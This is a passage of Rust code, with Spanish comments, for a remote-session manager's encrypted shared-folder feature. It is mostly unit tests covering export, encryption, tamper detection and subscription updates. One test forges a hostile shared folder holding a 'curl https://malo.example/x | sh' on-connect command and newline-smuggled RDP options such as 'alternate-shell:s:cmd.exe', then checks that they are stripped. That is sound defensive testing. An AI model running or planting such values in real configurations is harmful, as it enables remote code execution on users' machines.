pub fn is_shared(id: Uuid) -> bool {
    MARKS.lock().is_ok_and(|marks| marks.1.contains(&id))
}

/// `true` si el nodo es la raíz de una carpeta compartida.
pub fn is_shared_root(id: Uuid) -> bool {
    MARKS.lock().is_ok_and(|marks| marks.0.contains(&id))
}

/// Texto de una carpeta en el árbol de equipos: las compartidas se
/// distinguen de las propias.
pub fn folder_label(id: Uuid, name: &str) -> String {
    if is_shared_root(id) {
        trf!("👥 {name} (compartida)", name)
    } else {
        format!("📁 {name}")
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::model::{FolderDefaults, SerialOptions, Tunnel};

    const PASSWORD: &str = "contraseña del equipo";

    fn host(name: &str) -> Session {
        Session {
            name: name.into(),
            host: format!("{name}.interno"),
            username: "deploy".into(),
            ..Default::default()
        }
    }

    /// Un árbol con una carpeta «Equipo» (web, db, un puerto serie y una
    /// subcarpeta con otro equipo) y un bastión fuera de ella.
    fn team() -> (Tree, Uuid, Session, Session, Session) {
        let mut tree = Tree::default();
        let bastion = host("bastion");
        tree.upsert_session(None, bastion.clone());
        let folder = tree.add_folder(None, "Equipo");
        let db = host("db");
        let mut web = host("web");
        web.jumps = vec![bastion.id, db.id];
        web.on_connect = "sudo -i".into();
        web.agent_forwarding = true;
        web.x11_forwarding = true;
        web.tunnels = vec![Tunnel::default()];
        web.totp_autofill = true;
        web.bypass_proxy = true;
        web.notes = "ojo:\nreinicia despacio".into();
        tree.upsert_session(Some(folder), web.clone());
        tree.upsert_session(Some(folder), db.clone());
        tree.upsert_session(
            Some(folder),
            Session {
                name: "consola".into(),
                protocol: Protocol::Serial,
                serial: SerialOptions {
                    device: "/dev/ttyUSB0".into(),
                    ..Default::default()
                },
                ..Default::default()
            },
        );
        let sub = tree.add_folder(Some(folder), "Pruebas");
        tree.upsert_session(Some(sub), host("pre"));
        (tree, folder, web, db, bastion)
    }

    fn find<'a>(folder: &'a Folder, name: &str) -> &'a Session {
        sessions_of(folder)
            .into_iter()
            .find(|s| s.name == name)
            .unwrap_or_else(|| panic!("falta {name}"))
    }

    fn publication(folder: Uuid, path: &Path) -> Publication {
        Publication {
            folder,
            path: path.display().to_string(),
            ..Default::default()
        }
    }

    /// Escribe un fichero publicado a mano, como lo haría alguien que
    /// conoce la contraseña pero no usa GodRemote para publicar.
    fn forge(path: &Path, published: &Published) {
        let mut keys = Keyring::new(PASSWORD);
        let plain = serde_json::to_vec(published).unwrap();
        let sealed = sync::seal(SealKind::Share, &mut keys, &SealParams::fresh(), &plain).unwrap();
        std::fs::write(path, sealed).unwrap();
    }

    fn published(folder: Folder) -> Published {
        Published {
            format: FORMAT,
            id: Uuid::new_v4(),
            revision: 1,
            publisher: "alguien".into(),
            published_at: 0,
            folder,
        }
    }

    fn folder(name: &str, children: Vec<Node>) -> Folder {
        Folder {
            id: Uuid::new_v4(),
            name: name.into(),
            defaults: Default::default(),
            children,
        }
    }

    #[test]
    fn publishing_leaves_out_what_is_not_shared() {
        let (tree, team, web, db, bastion) = team();
        let export = export(&tree, team).unwrap().unwrap();
        assert_eq!(
            export.report,
            Cleaning {
                sessions: 3,
                dropped: 1,
                disarmed: 1,
                outside_jumps: 1,
            }
        );
        let shared = find(&export.folder, "web");
        assert!(shared.on_connect.is_empty() && shared.tunnels.is_empty());
        assert!(!shared.agent_forwarding && !shared.x11_forwarding);
        assert!(!shared.totp_autofill && !shared.bypass_proxy);
        // Lo que sí se comparte: dirección, usuario, saltos, notas.
        assert_eq!(
            (shared.host.as_str(), shared.username.as_str()),
            ("web.interno", "deploy")
        );
        assert_eq!(shared.jumps, vec![bastion.id, db.id]);
        assert_eq!(shared.notes, web.notes);
        assert_eq!(find(&export.folder, "pre").host, "pre.interno");
        assert!(
            sessions_of(&export.folder)
                .iter()
                .all(|s| s.name != "consola")
        );
        // El árbol propio no se toca.
        assert_eq!(tree.session(web.id).unwrap(), &web);
        // La huella solo cambia si cambia lo que se publicaría.
        let again = super::export(&tree, team).unwrap().unwrap();
        assert_eq!(again.digest, export.digest);
        let mut edited = tree.clone();
        if let Some(Node::Session(s)) = edited.find_mut(web.id) {
            s.on_connect = "otra orden".into();
        }
        assert_eq!(
            super::export(&edited, team).unwrap().unwrap().digest,
            export.digest,
            "lo que no se publica no cuenta"
        );
        if let Some(Node::Session(s)) = edited.find_mut(db.id) {
            s.port = 5432;
        }
        assert_ne!(
            super::export(&edited, team).unwrap().unwrap().digest,
            export.digest
        );
        // Una carpeta que ya no existe, o un equipo, no se publica.
        assert!(super::export(&tree, Uuid::new_v4()).is_none());
        assert!(super::export(&tree, web.id).is_none());
    }

    #[test]
    fn published_files_are_encrypted_and_checked() {
        let (tree, team, ..) = team();
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join(format!("equipo{FILE_SUFFIX}"));
        let mut keys = Keyring::new(PASSWORD);
        let mut publication = publication(team, &path);
        let export = publish(&tree, &mut publication, "sobremesa de Ana", &mut keys).unwrap();
        assert_eq!(publication.revision, 1);
        assert_eq!(publication.digest, export.digest);
        let raw = std::fs::read_to_string(&path).unwrap();
        for word in [
            "web.interno",
            "deploy",
            "Equipo",
            "Pruebas",
            "sobremesa de Ana",
            "reinicia",
        ] {
            assert!(!raw.contains(word), "«{word}» se lee en el fichero");
        }
        // Quien tiene la contraseña lo lee tal como se exportó.
        let fetched = fetch(&path, &mut Keyring::new(PASSWORD)).unwrap();
        assert_eq!(fetched.published.folder, export.folder);
        assert_eq!(fetched.published.publisher, "sobremesa de Ana");
        assert_eq!(fetched.published.id, publication.id);
        assert_eq!(fetched.report.outside_jumps, 1);
        assert_eq!(fetched.report.disarmed, 0);

        // Contraseña equivocada, fichero a medias, manipulado o de otro tipo.
        assert_eq!(
            fetch(&path, &mut Keyring::new("otra")).unwrap_err(),
            ShareError::Seal(SealError::WrongPassword)
        );
        let good = std::fs::read(&path).unwrap();
        std::fs::write(&path, &good[..good.len() / 2]).unwrap();
        let e = fetch(&path, &mut keys).unwrap_err();
        assert_eq!(e, ShareError::Seal(SealError::Incomplete));
        assert!(e.is_transient());
        let mut tampered = good.clone();
        let at = tampered.len() - 30;
        tampered[at] = if tampered[at] == b'A' { b'B' } else { b'A' };
        std::fs::write(&path, &tampered).unwrap();
        assert_eq!(
            fetch(&path, &mut keys).unwrap_err(),
            ShareError::Seal(SealError::Corrupt)
        );
        let as_sync = sync::seal(SealKind::Sync, &mut keys, &SealParams::fresh(), b"{}").unwrap();
        std::fs::write(&path, as_sync).unwrap();
        assert_eq!(
            fetch(&path, &mut keys).unwrap_err(),
            ShareError::Seal(SealError::Corrupt)
        );
        // Sin fichero o sin su carpeta: no disponible, se reintenta.
        std::fs::remove_file(&path).unwrap();
        assert!(fetch(&path, &mut keys).unwrap_err().is_transient());
        let nowhere = dir.path().join("no-montada").join("equipo.json");
        assert!(matches!(
            fetch(&nowhere, &mut keys).unwrap_err(),
            ShareError::Unavailable(_)
        ));

        // Volver a publicar: sube la revisión y conserva la sal (los
        // suscriptores no derivan otra clave).
        std::fs::write(&path, &good).unwrap();
        let salt =
            |raw: &[u8]| serde_json::from_slice::<serde_json::Value>(raw).unwrap()["salt"].clone();
        publish(&tree, &mut publication, "sobremesa", &mut keys).unwrap();
        assert_eq!(publication.revision, 2);
        let second = std::fs::read(&path).unwrap();
        assert_eq!(salt(&second), salt(&good));
        assert_eq!(fetch(&path, &mut keys).unwrap().published.revision, 2);
        // Si el fichero desaparece, se vuelve a crear.
        std::fs::remove_file(&path).unwrap();
        publish(&tree, &mut publication, "sobremesa", &mut keys).unwrap();
        assert_eq!(publication.revision, 3);
    }

    #[test]
    fn publishing_never_overwrites_someone_elses_file() {
        let (tree, team, ..) = team();
        let dir = tempfile::tempdir().unwrap();
        let mut keys = Keyring::new(PASSWORD);
        // Un fichero cualquiera.
        let notes = dir.path().join("notas.txt");
        std::fs::write(&notes, "no me pises").unwrap();
        let e = publish(&tree, &mut publication(team, &notes), "yo", &mut keys).unwrap_err();
        assert!(matches!(e, ShareError::Occupied(_)), "{e}");
        assert_eq!(std::fs::read_to_string(&notes).unwrap(), "no me pises");
        // Otra publicación (aunque sea con la misma contraseña).
        let other = dir.path().join("otra.json");
        let mut first = publication(team, &other);
        publish(&tree, &mut first, "yo", &mut keys).unwrap();
        let before = std::fs::read(&other).unwrap();
        let e = publish(&tree, &mut publication(team, &other), "yo", &mut keys).unwrap_err();
        assert!(matches!(e, ShareError::Occupied(_)), "{e}");
        // Una publicada con otra contraseña.
        let e = publish(&tree, &mut first, "yo", &mut Keyring::new("distinta")).unwrap_err();
        assert!(matches!(e, ShareError::Occupied(_)), "{e}");
        assert_eq!(std::fs::read(&other).unwrap(), before);
        // Una carpeta, o una ruta que no existe.
        let e = publish(&tree, &mut publication(team, dir.path()), "yo", &mut keys).unwrap_err();
        assert!(matches!(e, ShareError::Occupied(_)), "{e}");
        let nowhere = dir.path().join("no-existe").join("x.json");
        let e = publish(&tree, &mut publication(team, &nowhere), "yo", &mut keys).unwrap_err();
        assert!(e.is_transient(), "{e}");
        assert!(!dir.path().join("no-existe").exists());
        // Y una carpeta que ya no está en el árbol.
        let gone = dir.path().join("ida.json");
        let e = publish(
            &tree,
            &mut publication(Uuid::new_v4(), &gone),
            "yo",
            &mut keys,
        )
        .unwrap_err();
        assert!(matches!(e, ShareError::Invalid(_)), "{e}");
        assert!(!gone.exists());
    }

    #[test]
    fn hostile_published_folders_are_cleaned() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("trampa.json");
        let mut keys = Keyring::new(PASSWORD);
        let hostile = Session {
            name: "web\n/app:cmd.exe".into(),
            protocol: Protocol::Rdp,
            host: "win.example\r\nalternate-shell:s:cmd.exe".into(),
            port: 3389,
            username: "ana\n/drive:todo,/".into(),
            key_path: "~/.ssh/id\u{0}\n".into(),
            on_connect: "curl https://malo.example/x | sh".into(),
            agent_forwarding: true,
            x11_forwarding: true,
            totp_autofill: true,
            bypass_proxy: true,
            tunnels: vec![Tunnel {
                listen_host: "0.0.0.0".into(),
                ..Default::default()
            }],
            jumps: (0..20).map(|_| Uuid::new_v4()).collect(),
            notes: format!("visible\u{1b}[2J{}", "x".repeat(MAX_NOTES * 2)),
            ..Default::default()
        };
        let mut hostile = hostile;
        hostile.rdp.domain = "CORP\n/admin".into();
        hostile.rdp.width = 999_999;
        let twin = host("gemelo");
        let mut inheriting = host("hereda");
        inheriting.inherit_auth = true;
        let mut with_key = host("con-clave");
        with_key.inherit_auth = true;
        let mut passwords = folder("Con contraseña\tde carpeta\n", vec![]);
        passwords.defaults = FolderDefaults {
            username: "root\n".into(),
            auth: Some(AuthMethod::Password),
            ..Default::default()
        };
        let mut keyed = folder("Con clave", vec![Node::Session(with_key.clone())]);
        keyed.defaults.auth = Some(AuthMethod::Key);
        keyed.defaults.key_path = "~/.ssh/equipo".into();
        passwords.children = vec![Node::Session(inheriting.clone()), Node::Folder(keyed)];
        let root = folder(
            "Trampa",
            vec![
                Node::Session(hostile.clone()),
                Node::Session(twin.clone()),
                Node::Session(twin.clone()),
                Node::Session(Session {
                    protocol: Protocol::Serial,
                    ..host("serie")
                }),
                Node::Session(Session {
                    host: "  ".into(),
                    ..host("sin-direccion")
                }),
                Node::Session(Session {
                    host: "dos palabras".into(),
                    ..host("con-espacio")
                }),
                Node::Session(Session {
                    port: 0,
                    ..host("sin-puerto")
                }),
                Node::Folder(passwords),
            ],
        );
        forge(&path, &published(root));
        let fetched = fetch(&path, &mut keys).unwrap();
        let clean = &fetched.published.folder;
        assert_eq!(fetched.report.sessions, 4);
        assert_eq!(fetched.report.dropped, 5);
        assert_eq!(fetched.report.disarmed, 1);
        assert_eq!(fetched.report.outside_jumps, MAX_JUMPS);
        assert_eq!(fetched.report.warnings().len(), 3);
        let s = find(clean, "web/app:cmd.exe");
        // Ni un salto de línea por el que colar opciones al cliente RDP.
        for text in [&s.name, &s.host, &s.username, &s.key_path, &s.rdp.domain] {
            assert!(!text.chars().any(char::is_control), "{text:?}");
        }
        assert_eq!(s.host, "win.examplealternate-shell:s:cmd.exe");
        assert!(!crate::rdp::rdp_file(s).contains("\r\nalternate"));
        assert_eq!(
            crate::rdp::rdp_file(s).matches("\r\n").count(),
            crate::rdp::rdp_file(&host("normal"))
                .matches("\r\n")
                .count()
        );
        // Nada que ejecute, reenvíe o abra puertos.
        assert!(s.on_connect.is_empty() && s.tunnels.is_empty());
        assert!(!s.agent_forwarding && !s.x11_forwarding && !s.totp_autofill);
        assert!(!s.bypass_proxy);
        assert_eq!(s.jumps.len(), MAX_JUMPS);
        assert!(s.notes.starts_with("visible[2J") && s.notes.chars().count() == MAX_NOTES);
        assert_eq!(s.rdp.width, 8192);
        // La contraseña de carpeta pasa a ser de cada equipo; la clave de
        // carpeta se sigue heredando.
        let Some(Node::Folder(passwords)) =
            clean.children.iter().find(|n| matches!(n, Node::Folder(_)))
        else {
            panic!("falta la subcarpeta")
        };
        assert_eq!(passwords.name, "Con contraseñade carpeta");
        assert_eq!(passwords.defaults.auth, None);
        assert_eq!(passwords.defaults.username, "root");
        let inherited = find(clean, "hereda");
        assert!(!inherited.inherit_auth && inherited.auth == AuthMethod::Password);
        assert!(find(clean, "con-clave").inherit_auth);

        // Demasiado honda, demasiado grande o de una versión futura.
        let mut deep = folder("fondo", vec![]);
        for level in 0..=MAX_DEPTH {
            deep = folder(&format!("nivel {level}"), vec![Node::Folder(deep)]);
        }
        forge(&path, &published(deep));
        assert!(matches!(
            fetch(&path, &mut keys).unwrap_err(),
            ShareError::Invalid(_)
        ));
        let crowd = folder(
            "multitud",
            (0..=MAX_NODES)
                .map(|n| Node::Session(host(&format!("h{n}"))))
                .collect(),
        );
        forge(&path, &published(crowd));
        assert!(matches!(
            fetch(&path, &mut keys).unwrap_err(),
            ShareError::Invalid(_)
        ));
        let mut future = published(folder("mañana", vec![]));
        future.format = FORMAT + 1;
        forge(&path, &future);
        assert_eq!(
            fetch(&path, &mut keys).unwrap_err(),
            ShareError::Seal(SealError::Newer)
        );
        std::fs::write(&path, "{\"carpeta\": 1}").unwrap();
        assert_eq!(
            fetch(&path, &mut keys).unwrap_err(),
            ShareError::Seal(SealError::Corrupt)
        );
    }

    #[test]
    fn subscribers_get_their_own_ids_and_credentials() {
        let (tree, team, web, db, bastion) = team();
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("equipo.json");
        let mut keys = Keyring::new(PASSWORD);
        let mut publication = publication(team, &path);
        publish(&tree, &mut publication, "ana", &mut keys).unwrap();
        let fetched = fetch(&path, &mut keys).unwrap();
        let mut sub = Subscription::new("equipo.json", &fetched);
        assert_eq!(sub.id, subscription_id(publication.id));
        let changes = sub.accept(&fetched).unwrap();
        assert_eq!(changes.added.len(), 3);
        assert_eq!((sub.revision, sub.publisher.as_str()), (1, "ana"));
        assert_eq!(sub.name(), "Equipo");

        // En el árbol de quien se suscribe: la misma carpeta con
        // identificadores propios, que no elige quien publica.
        let mut mine = Tree::default();
        let own = host("mío");
        mine.upsert_session(None, own.clone());
        assert_eq!(sub.place(&mut mine, None), 0);
        let local_web = local_id(sub.id, web.id);
        let local_db = local_id(sub.id, db.id);
        assert!(mine.find(web.id).is_none() && mine.find(team).is_none());
        assert_eq!(mine.parent_of(local_web), Some(sub.id));
        let grafted = mine.session(local_web).unwrap();
        assert_eq!(grafted.host, "web.interno");
        // Los saltos de dentro siguen apuntando a sus equipos; el de fuera
        // no existe aquí (y no puede apuntar a uno mío).
        assert_eq!(grafted.jumps, vec![local_id(sub.id, bastion.id), local_db]);
        assert!(mine.find(local_id(sub.id, bastion.id)).is_none());
        assert!(
            mine.jump_path(grafted)
                .unwrap_err()
                .contains("ya no existe")
        );
        assert_eq!(mine.session_paths().len(), 4, "{:?}", mine.session_paths());
        assert_eq!(sub.session_ids().len(), 3);
        // Sus credenciales guardadas son de cada equipo, con su
        // identificador local.
        let resolved = mine.resolved_session(local_db).unwrap();
        assert_eq!(resolved.password_key(), format!("{local_db}/password"));
        assert_ne!(password_key(sub.id, false), format!("{}/password", sub.id));

        // Los mismos identificadores publicados en otra publicación dan
        // otros identificadores locales.
        let other = Subscription {
            id: subscription_id(Uuid::new_v4()),
            ..sub.clone()
        };
        assert_ne!(local_id(other.id, web.id), local_web);
        // Y aunque alguien publique un equipo con el identificador de uno
        // mío, aquí no coincide con él.
        assert_ne!(local_id(sub.id, own.id), own.id);

        // Mi usuario y mi clave, sin tocar lo publicado.
        sub.my_username = " ana.garcia ".into();
        sub.my_auth = Some(AuthMethod::Key);
        sub.my_key_path = "~/.ssh/mia".into();
        let before = sub.content.clone();
        assert_eq!(sub.place(&mut mine, before.as_ref()), 0);
        let resolved = mine.resolved_session(local_web).unwrap();
        assert_eq!(
            (
                resolved.username.as_str(),
                resolved.auth,
                resolved.key_path.as_str()
            ),
            ("ana.garcia", AuthMethod::Key, "~/.ssh/mia")
        );
        assert_eq!(resolved.passphrase_key(), format!("{}/passphrase", sub.id));
        assert_eq!(sub.content, before);
        // Una contraseña común a toda la carpeta no se admite: quien
        // publica podría añadir un equipo suyo y recibirla.
        sub.my_auth = Some(AuthMethod::Password);
        sub.place(&mut mine, before.as_ref());
        let resolved = mine.resolved_session(local_web).unwrap();
        assert_eq!(resolved.password_key(), format!("{local_web}/password"));
        // El árbol sigue teniendo lo mío, y la carpeta en su sitio.
        assert_eq!(mine.nodes.len(), 2);
        assert_eq!(mine.nodes[0].id(), own.id);
    }

    #[test]
    fn updates_replace_the_folder_and_say_what_changed() {
        let (mut tree, team, web, db, _) = team();
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("equipo.json");
        let mut keys = Keyring::new(PASSWORD);
        let mut publication = publication(team, &path);
        publish(&tree, &mut publication, "ana", &mut keys).unwrap();
        let first = fetch(&path, &mut keys).unwrap();
        let mut sub = Subscription::new("equipo.json", &first);
        sub.accept(&first).unwrap();
        let mut mine = Tree::default();
        let (above, below) = (host("arriba"), host("abajo"));
        mine.upsert_session(None, above.clone());
        sub.place(&mut mine, None);
        mine.upsert_session(None, below.clone());
        // El usuario mete algo suyo dentro de la carpeta compartida.
        let stray = host("colado");
        assert!(!sub.has_strangers(&mine));
        mine.upsert_session(Some(sub.id), stray.clone());
        assert!(sub.has_strangers(&mine));

        // Quien publica cambia una dirección, quita un equipo y añade otro.
        if let Some(Node::Session(s)) = tree.find_mut(web.id) {
            s.host = "web.nuevo".into();
        }
        tree.remove(db.id);
        tree.upsert_session(Some(team), host("cache"));
        publish(&tree, &mut publication, "ana", &mut keys).unwrap();
        let second = fetch(&path, &mut keys).unwrap();
        assert_ne!(second.fingerprint, first.fingerprint);
        let previous = sub.content.clone();
        let mut changes = sub.accept(&second).unwrap();
        changes.rescued = sub.place(&mut mine, previous.as_ref());
        let local_web = local_id(sub.id, web.id);
        let local_db = local_id(sub.id, db.id);
        assert_eq!(changes.added, ["cache"]);
        assert_eq!(changes.removed, [(local_db, "db".to_string())]);
        assert_eq!(
            changes.readdressed,
            [(
                local_web,
                "web".to_string(),
                "SSH web.interno:22".to_string(),
                "SSH web.nuevo:22".to_string()
            )]
        );
        assert_eq!(changes.rescued, 1);
        assert!(!sub.has_strangers(&mine));
        assert!(
            changes
                .summary()
                .contains("«web»: SSH web.interno:22 ➡ SSH web.nuevo:22")
        );
        // La contraseña guardada para la dirección anterior se olvidará.
        assert_eq!(sub.forget, [local_web]);
        assert_eq!(mine.session(local_web).unwrap().host, "web.nuevo");
        assert!(mine.find(local_db).is_none());
        // La carpeta sigue en su sitio y lo que no era suyo no se pierde.
        let order: Vec<Uuid> = mine.nodes.iter().map(Node::id).collect();
        assert_eq!(order, [above.id, sub.id, below.id, stray.id]);
        assert_eq!(mine.parent_of(stray.id), None);

        // Un fichero más antiguo que el último visto no se acepta.
        let stale = sub.accept(&first).unwrap_err();
        assert_eq!(stale, ShareError::Stale { seen: 2, found: 1 });
        assert_eq!(sub.revision, 2);
        assert_eq!(sub.content.as_ref(), Some(&second.published.folder));
        // Otra publicación en la misma ruta: se acepta, avisando.
        let mut replaced = second.clone();
        replaced.published.id = Uuid::new_v4();
        replaced.published.revision = 1;
        let changes = sub.accept(&replaced).unwrap();
        assert!(changes.is_empty());
        assert!(
            sub.warnings[0].contains("otra publicación"),
            "{:?}",
            sub.warnings
        );

        // Dejar de seguirla: se va la carpeta, no lo propio.
        mine.upsert_session(Some(sub.id), host("otro-colado"));
        assert_eq!(sub.remove_from(&mut mine), 1);
        assert!(mine.find(sub.id).is_none() && mine.find(local_web).is_none());
        assert_eq!(mine.nodes.len(), 4);
    }

    #[test]
    fn shared_folders_are_marked_for_the_interface() {
        let mut tree = Tree::default();
        let own = tree.add_folder(None, "Mía");
        let shared = tree.add_folder(None, "Del equipo");
        let inside = host("dentro");
        tree.upsert_session(Some(shared), inside.clone());
        mark(&tree, &BTreeSet::from([shared]));
        assert!(is_shared_root(shared) && is_shared(shared) && is_shared(inside.id));
        assert!(!is_shared_root(inside.id) && !is_shared(own));
        assert_eq!(folder_label(own, "Mía"), "📁 Mía");
        assert_eq!(
            folder_label(shared, "Del equipo"),
            "👥 Del equipo (compartida)"
        );
        mark(&tree, &BTreeSet::new());
        assert!(!is_shared(inside.id));
        // Las contraseñas de publicar y de seguir no se confunden con las
        // de conectar.
        assert_ne!(password_key(shared, true), password_key(shared, false));
        // Lo que se recuerda va a un fichero privado.
        let dir = tempfile::tempdir().unwrap();
        let store = ShareStore {
            publications: vec![publication(own, Path::new("/x/y.json"))],
            subscriptions: vec![Subscription {
                id: shared,
                ..Default::default()
            }],
        };
        store.save(dir.path()).unwrap();
        assert_eq!(ShareStore::load(dir.path()), store);
        assert_eq!(subscribed_roots(dir.path()), BTreeSet::from([shared]));
        assert!(subscribed_roots(&dir.path().join("nada")).is_empty());
    }

    #[test]
    fn warnings_are_stored_as_data_and_drafted_when_read() {
        let store = ShareStore {
            publications: vec![],
            subscriptions: vec![Subscription {
                replaced: true,
                report: Cleaning {
                    sessions: 2,
                    dropped: 1,
                    disarmed: 3,
                    outside_jumps: 4,
                },
                ..Default::default()
            }],
        };
        let dir = tempfile::tempdir().unwrap();
        store.save(dir.path()).unwrap();
        // En disco va el dato y no el texto: lo que se guarde en un idioma
        // se tiene que poder leer en otro.
        let saved = std::fs::read_to_string(ShareStore::file(dir.path())).unwrap();
        for drafted in ["publicación", "equipo(s)", "salto(s)", "avisos"] {
            assert!(!saved.contains(drafted), "«{drafted}» está en {saved}");
        }
        let read = ShareStore::load(dir.path());
        let warnings = &read.subscriptions[0].warnings;
        assert_eq!(warnings.len(), 4, "{warnings:?}");
        assert!(warnings[0].contains("otra publicación"));
        assert!(warnings[1].starts_with("3 equipo(s) traían órdenes"));
        assert!(warnings[2].starts_with("1 equipo(s) se han dejado fuera"));
        assert!(warnings[3].starts_with("4 salto(s) pasan"));
        assert_eq!(*warnings, read.subscriptions[0].notices());
        // Un fichero de antes, con los avisos ya redactados, también se lee.
        let old = r#"{"suscripciones":[{"ruta":"/x/y.json","avisos":["un aviso viejo"]}]}"#;
        std::fs::write(ShareStore::file(dir.path()), old).unwrap();
        let read = ShareStore::load(dir.path());
        assert_eq!(read.subscriptions[0].path, "/x/y.json");
        assert!(read.subscriptions[0].warnings.is_empty());
    }
}
